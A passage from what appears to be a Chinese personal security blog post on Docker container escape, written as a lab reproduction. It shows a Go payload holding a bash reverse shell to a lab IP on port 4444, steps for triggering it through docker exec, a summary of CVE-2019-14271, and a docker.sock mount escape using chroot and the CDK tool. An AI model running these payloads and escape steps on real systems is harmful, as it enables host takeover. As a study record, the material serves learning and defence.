var payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.137.129&#x2F;4444 0&gt;&amp;1&quot;</code></pre>

<p><br />ip 修改为kali的IP地址。端口设置为kali的nc监听的端口。<br />然后编译main.go文件，需要go语言环境，而且在Linux环境中，安装<code>apt install golang</code><br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">go build main.go<span class="token comment">#编译go文件</span>
<span class="token comment">#复制到docker里面</span>
docker <span class="token function">cp</span> ./main ccc443617e49:/home
<span class="token comment">#修改权限</span>
<span class="token function">chmod</span> <span class="token number">777</span> main</code></pre>

<p><br />看到在docker里面是已经复制过来了。<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818276-188781c9-5aee-43a6-8364-d5e20e04cb11.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&originHeight=100&originWidth=599&size=0&status=done&style=none&width=599" loading="lazy"><br />执行main文件<code>./main</code><br />然后重新开启新终端，后使用exec进入docker。<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token builtin class-name">exec</span> -it ccc443617e49 /bin/bash</code></pre>

<p><br />然后payload成功执行<br /><br><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/2432392/1615903818201-2b418c11-3f0b-404c-8a76-1793033df13f.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&originHeight=158&originWidth=717&size=0&status=done&style=none&width=717" loading="lazy"><br />这个已经是成功了，然后nc监听的端口，反弹回shell<br /></p>
<p><a name="137e7004"></a></p>
<h3 id="Docker-cp命令可导致容器逃逸攻击漏洞（CVE-2019-14271）"><a href="#Docker-cp命令可导致容器逃逸攻击漏洞（CVE-2019-14271）" class="headerlink" title="Docker cp命令可导致容器逃逸攻击漏洞（CVE-2019-14271）"></a>Docker cp命令可导致容器逃逸攻击漏洞（CVE-2019-14271）</h3><p><br />漏洞描述：当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss_.so库。黑客可以通过在容器中替换libnss_.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。<br />在这篇<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193218">翻译文章</a>有介绍，网上没有找到相应的环境，也懒得搭建环境了，复现过程省略==<br />而且，复现对目前我来说有点困难，所以只了解一下。<br /></p>
<p><a name="bef623de"></a></p>
<h3 id="危险挂载导致Docker-逃逸"><a href="#危险挂载导致Docker-逃逸" class="headerlink" title="危险挂载导致Docker 逃逸"></a>危险挂载导致Docker 逃逸</h3><p><br />挂载目录（-v /:/soft）<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash</code></pre>

<p><br />先放一个工具cdk：<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK/">https://github.com/cdk-team/CDK/</a><br />使用：下载可执行文件投递到已攻入的容器内部开始测试<br />使用说明：<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=840">https://www.cdxy.me/?p=840</a><br /><strong>复现逃逸过程</strong><br />创建一个挂载/var/run/docker.sock的容器<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu</code></pre>

<p><br />然后exec进入容器中去，在容器中执行以下命令安装docker命令行客户端。<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">apt-update
<span class="token function">apt-get</span> <span class="token function">install</span> <span class="token punctuation">\</span>
apt-transport-https <span class="token punctuation">\</span>
ca-certificates <span class="token punctuation">\</span>
<span class="token function">curl</span> <span class="token punctuation">\</span>
gnupg-agent <span class="token punctuation">\</span>
software-properties-common
<span class="token function">curl</span> -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg <span class="token operator">|</span> apt-key <span class="token function">add</span> -
apt-key fingerprint 0EBFCD88
add-apt-repository <span class="token punctuation">\</span>
<span class="token string">"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \
<span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> \
stable"</span>
<span class="token function">apt-get</span> update
<span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io</code></pre>

<p><br />接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">docker run -it -v /:/host ubuntu:18.04 /bin/bash</code></pre>

<p><br />在新容器内执行chroot将根目录切换到挂载的宿主机根目录。<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /test</code></pre>

<p><br />使用cdk工具执行命令：<br /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./cdk run docker-sock-pwn /var/run/docker.sock <span class="token string">"touch /host/tmp/pwn-success"</span></code></pre>


<p><a name="7a0a21d5"></a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><br />docker逃逸方面还有许多内容，只是由于时间问题暂时总结这么多，给自己做个记录，也不用到处翻看资料了，剩下的目前未完成的知识点，已经放在下方链接中，等以后再研究。<br /></p>
<p><a name="2a302fa5"></a></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><br /><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1512483">https://cloud.tencent.com/developer/article/1512483</a><br /><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8558">https://xz.aliyun.com/t/8558</a><br /><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/49b2155ed477">https://www.jianshu.com/p/49b2155ed477</a><br /><a target="_blank" rel="noopener" href="https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet">https://threezh1.com/2021/02/26/云原生安全Cheat_Sheet</a><br /><a target="_blank" rel="noopener" href="https://www.ofweek.com/security/2020-07/ART-510010-11000-30450447_3.html">https://www.ofweek.com/security/2020-07/ART-510010-11000-30450447_3.html</a><br /><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8558">https://xz.aliyun.com/t/8558</a><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /><br><br /></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/abcd4c1e/" title="Docker逃逸">https://m0re.top/posts/abcd4c1e/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/6cc4794c/" rel="next" title="从一道CTF题目到非对称加密GPG/PGP的学习"><span class="post-nav-text">从一道CTF题目到非对称加密GPG/PGP的学习</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function initValine() {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = window.location.pathname
  new Valine(valineConfig)
}
setTimeout(initValine, 800)</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  window.setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>